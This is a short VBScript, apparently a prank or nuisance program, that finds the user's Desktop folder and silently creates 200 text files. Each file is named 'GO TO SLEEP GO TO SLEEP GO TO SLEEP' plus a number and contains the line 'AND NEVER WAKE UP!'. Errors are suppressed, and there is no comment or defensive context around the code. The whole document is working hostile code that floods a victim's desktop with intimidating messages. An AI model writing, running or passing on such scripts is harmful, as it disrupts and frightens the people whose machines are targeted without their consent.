set x = createobject("Wscript.shell")
set c = createobject("Scripting.filesystemobject")
on error resume next
dim dsk : dsk=x.specialfolders("DESKTOP")
for nexfil=1 to 200
set p=c.CreateTextFile(""&dsk&"\GO TO SLEEP GO TO SLEEP GO TO SLEEP                  "&nexfil&".txt")
p.write"AND NEVER WAKE UP!"
p.close
next